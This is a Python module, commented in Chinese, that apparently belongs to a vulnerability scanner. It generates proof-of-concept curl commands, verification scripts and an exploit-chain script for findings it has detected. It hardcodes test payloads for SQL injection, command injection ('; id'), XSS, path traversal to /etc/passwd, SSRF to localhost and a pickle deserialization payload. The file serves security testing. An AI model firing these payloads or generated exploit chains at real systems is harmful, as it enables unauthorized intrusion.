# -*- coding: utf-8 -*-
"""
PoC生成器 - 自动生成漏洞验证代码
支持生成curl命令、Python脚本等
"""
import os
import json
import base64
from typing import Dict, List, Optional, Any
from urllib.parse import urljoin, urlencode

import sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.config import (
    Vulnerability, PoC, VulnerabilityType, SourcePoint, SinkPoint,
    Config
)


class PoCGenerator:
    """PoC生成器"""
    
    def __init__(self, config: Config, base_url: str = "http://localhost:5000"):
        self.config = config
        self.base_url = base_url
        self._load_payloads()
    
    def _load_payloads(self):
        """加载payload库"""
        self.payloads = {}
        
        # 加载各漏洞类型的payload
        sources_dir = os.path.join(self.config.rules_dir, 'sources')
        if os.path.exists(sources_dir):
            for filename in os.listdir(sources_dir):
                if filename.endswith('.json'):
                    filepath = os.path.join(sources_dir, filename)
                    try:
                        with open(filepath, 'r', encoding='utf-8') as f:
                            data = json.load(f)
                            for vuln_type, vuln_data in data.items():
                                if 'payloads' in vuln_data:
                                    self.payloads[vuln_type] = vuln_data['payloads']
                    except Exception:
                        pass
    
    def generate_poc(self, vulnerability: Vulnerability) -> Optional[PoC]:
        """
        为漏洞生成PoC
        
        Args:
            vulnerability: 漏洞对象
            
        Returns:
            PoC对象，如果无法生成则返回None
        """
        source = vulnerability.source
        sink = vulnerability.sink
        vuln_type = vulnerability.vulnerability_type
        
        # 获取合适的payload
        payload = self._get_payload(vuln_type)
        if not payload:
            return None
        
        # 构建URL
        url = self._build_url(source)
        
        # 根据HTTP方法和参数类型构建请求
        if source.http_method.upper() == 'GET':
            poc = self._generate_get_poc(source, sink, vuln_type, url, payload)
        else:
            poc = self._generate_post_poc(source, sink, vuln_type, url, payload)
        
        return poc
    
    def _get_payload(self, vuln_type: VulnerabilityType) -> Optional[str]:
        """获取适合的payload"""
        vuln_type_str = vuln_type.value
        
        if vuln_type_str not in self.payloads:
            return None
        
        payloads = self.payloads[vuln_type_str]
        
        # 根据漏洞类型选择合适的payload
        if vuln_type == VulnerabilityType.SQL_INJECTION:
            # 选择一个简单的SQL注入payload
            if 'mysql' in payloads:
                return payloads['mysql'][0]
            return list(payloads.values())[0][0] if payloads else "' OR '1'='1"
        
        elif vuln_type == VulnerabilityType.COMMAND_INJECTION:
            # 选择一个安全的命令注入payload（仅用于验证）
            if 'generic' in payloads:
                return payloads['generic'][0]
            return "; id"
        
        elif vuln_type == VulnerabilityType.XSS:
            if 'reflected' in payloads:
                return payloads['reflected'][0]
            return "<script>alert('XSS')</script>"
        
        elif vuln_type == VulnerabilityType.PATH_TRAVERSAL:
            if 'linux' in payloads:
                return payloads['linux'][5]  # ../../../../../etc/passwd
            return "../../../../../../etc/passwd"
        
        elif vuln_type == VulnerabilityType.SSRF:
            if 'internal' in payloads:
                return payloads['internal'][0]
            return "http://127.0.0.1"
        
        elif vuln_type == VulnerabilityType.DESERIALIZATION:
            if 'python_pickle' in payloads:
                return payloads['python_pickle'][0]
            return base64.b64encode(b"cos\nsystem\n(S'id'\ntR.").decode()
        
        return None
    
    def _build_url(self, source: SourcePoint) -> str:
        """构建请求URL"""
        route = source.route
        # 替换路径参数
        if '{' in route:
            route = re.sub(r'\{[^}]+\}', 'test', route)
        if ':' in route:
            route = re.sub(r':[^/]+', 'test', route)
        
        return urljoin(self.base_url, route)
    
    def _generate_get_poc(self, source: SourcePoint, sink: SinkPoint,
                         vuln_type: VulnerabilityType, url: str, 
                         payload: str) -> PoC:
        """生成GET请求的PoC"""
        # 构建查询参数
        params = {}
        if source.parameters:
            # 将payload注入到第一个参数
            params[source.parameters[0]] = payload
        else:
            # 尝试从sink点提取参数
            for arg in sink.arguments:
                if 'request' in arg.lower() or 'query' in arg.lower():
                    params['input'] = payload
                    break
        
        # 构建完整URL
        if params:
            full_url = f"{url}?{urlencode(params)}"
        else:
            full_url = url
        
        # 生成curl命令
        curl_cmd = f"curl -X GET \"{full_url}\""
        
        # 生成Python代码
        python_code = self._generate_python_code('GET', url, params, {}, vuln_type)
        
        # 预期结果
        expected_result = self._get_expected_result(vuln_type)
        
        return PoC(
            vulnerability_type=vuln_type,
            http_method='GET',
            url=full_url,
            params=params,
            payload=payload,
            expected_result=expected_result,
            curl_command=curl_cmd,
            python_code=python_code
        )
    
    def _generate_post_poc(self, source: SourcePoint, sink: SinkPoint,
                          vuln_type: VulnerabilityType, url: str,
                          payload: str) -> PoC:
        """生成POST请求的PoC"""
        # 构建POST数据
        data = {}
        if source.parameters:
            data[source.parameters[0]] = payload
        else:
            data['input'] = payload
        
        # 生成curl命令
        data_str = '&'.join([f"{k}={v}" for k, v in data.items()])
        curl_cmd = f"curl -X POST \"{url}\" -d \"{data_str}\""
        
        # 生成Python代码
        python_code = self._generate_python_code('POST', url, {}, data, vuln_type)
        
        # 预期结果
        expected_result = self._get_expected_result(vuln_type)
        
        return PoC(
            vulnerability_type=vuln_type,
            http_method='POST',
            url=url,
            data=data,
            payload=payload,
            expected_result=expected_result,
            curl_command=curl_cmd,
            python_code=python_code
        )
    
    def _generate_python_code(self, method: str, url: str, 
                             params: Dict, data: Dict,
                             vuln_type: VulnerabilityType) -> str:
        """生成Python验证代码"""
        code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
漏洞验证脚本
漏洞类型: {vuln_type.value}
目标URL: {url}
"""
import requests
import sys

def test_vulnerability():
    """测试漏洞是否存在"""
    url = "{url}"
    
    try:
        if "{method}" == "GET":
            params = {json.dumps(params, indent=12, ensure_ascii=False)}
            response = requests.get(url, params=params, timeout=10)
        else:
            data = {json.dumps(data, indent=12, ensure_ascii=False)}
            response = requests.post(url, data=data, timeout=10)
        
        print(f"[*] 状态码: {{response.status_code}}")
        print(f"[*] 响应长度: {{len(response.text)}}")
        
        # 检查漏洞特征
        {self._get_check_logic(vuln_type)}
        
        return True
        
    except requests.exceptions.RequestException as e:
        print(f"[!] 请求失败: {{e}}")
        return False

if __name__ == "__main__":
    print("[*] 开始漏洞验证...")
    if test_vulnerability():
        print("[+] 漏洞验证成功!")
    else:
        print("[-] 漏洞验证失败")
'''
        return code
    
    def _get_check_logic(self, vuln_type: VulnerabilityType) -> str:
        """获取漏洞检查逻辑"""
        check_logic = {
            VulnerabilityType.SQL_INJECTION: '''
        # SQL注入检查
        if "error" in response.text.lower() or "sql" in response.text.lower():
            print("[+] 可能存在SQL注入漏洞")
            print(f"[*] 响应内容片段: {response.text[:500]}")
        elif response.status_code == 200:
            print("[?] 需要进一步确认，响应正常")''',
            
            VulnerabilityType.COMMAND_INJECTION: '''
        # 命令注入检查
        if "uid=" in response.text or "gid=" in response.text:
            print("[+] 存在命令注入漏洞!")
            print(f"[*] 命令执行结果: {response.text[:500]}")
        elif "root:" in response.text:
            print("[+] 存在命令注入漏洞，读取到/etc/passwd内容")''',
            
            VulnerabilityType.XSS: '''
        # XSS检查
        if "<script>alert" in response.text.lower():
            print("[+] 存在XSS漏洞!")
            print(f"[*] Payload被反射: {response.text[:500]}")''',
            
            VulnerabilityType.PATH_TRAVERSAL: '''
        # 路径遍历检查
        if "root:" in response.text or "[extensions]" in response.text:
            print("[+] 存在路径遍历漏洞!")
            print(f"[*] 文件内容: {response.text[:500]}")''',
            
            VulnerabilityType.SSRF: '''
        # SSRF检查
        if response.status_code == 200:
            print("[+] SSRF请求成功")
            print(f"[*] 响应内容: {response.text[:500]}")''',
            
            VulnerabilityType.DESERIALIZATION: '''
        # 反序列化检查
        if response.status_code == 200:
            print("[+] 反序列化请求成功")
            print("[*] 注意: 需要检查服务器是否执行了payload")'''
        }
        
        return check_logic.get(vuln_type, 'print("[*] 请手动检查响应内容")')
    
    def _get_expected_result(self, vuln_type: VulnerabilityType) -> str:
        """获取预期结果描述"""
        expected = {
            VulnerabilityType.SQL_INJECTION: "返回SQL错误信息或异常数据",
            VulnerabilityType.COMMAND_INJECTION: "返回命令执行结果(如uid、gid等)",
            VulnerabilityType.XSS: "Payload被反射到响应中",
            VulnerabilityType.PATH_TRAVERSAL: "返回敏感文件内容(如/etc/passwd)",
            VulnerabilityType.SSRF: "成功访问内部资源",
            VulnerabilityType.DESERIALIZATION: "服务器执行了反序列化payload"
        }
        return expected.get(vuln_type, "需要手动验证")
    
    def generate_batch_pocs(self, vulnerabilities: List[Vulnerability]) -> List[PoC]:
        """
        批量生成PoC
        
        Args:
            vulnerabilities: 漏洞列表
            
        Returns:
            PoC列表
        """
        pocs = []
        for vuln in vulnerabilities:
            poc = self.generate_poc(vuln)
            if poc:
                pocs.append(poc)
        return pocs
    
    def save_poc_to_file(self, poc: PoC, output_path: str):
        """将PoC保存到文件"""
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(f"# PoC for {poc.vulnerability_type.value}\n\n")
            f.write(f"## curl命令\n```\n{poc.curl_command}\n```\n\n")
            f.write(f"## Python脚本\n```python\n{poc.python_code}\n```\n")
    
    def generate_exploit_chain(self, vulnerabilities: List[Vulnerability]) -> str:
        """
        生成漏洞利用链脚本
        
        Args:
            vulnerabilities: 相关漏洞列表
            
        Returns:
            利用链脚本
        """
        script = '''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
漏洞利用链脚本
"""
import requests
import sys

class ExploitChain:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
    
'''
        
        for i, vuln in enumerate(vulnerabilities):
            poc = self.generate_poc(vuln)
            if poc:
                script += f'''
    def exploit_{i+1}(self):
        """利用漏洞: {vuln.vulnerability_type.value}"""
        url = "{poc.url}"
        print(f"[*] 尝试利用: {vuln.vulnerability_type.value}")
        
        try:
            if "{poc.http_method}" == "GET":
                response = self.session.get(url, params={poc.params}, timeout=10)
            else:
                response = self.session.post(url, data={poc.data}, timeout=10)
            
            print(f"[*] 状态码: {{response.status_code}}")
            return response
        except Exception as e:
            print(f"[!] 利用失败: {{e}}")
            return None

'''
        
        script += '''
    def run(self):
        """执行完整的利用链"""
        print("[*] 开始执行漏洞利用链...")
'''
        
        for i in range(len(vulnerabilities)):
            script += f'''        self.exploit_{i+1}()
'''
        
        script += '''        print("[*] 利用链执行完成")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python exploit_chain.py <target_url>")
        sys.exit(1)
    
    target = sys.argv[1]
    chain = ExploitChain(target)
    chain.run()
'''
        return script


# 导入re模块
import re
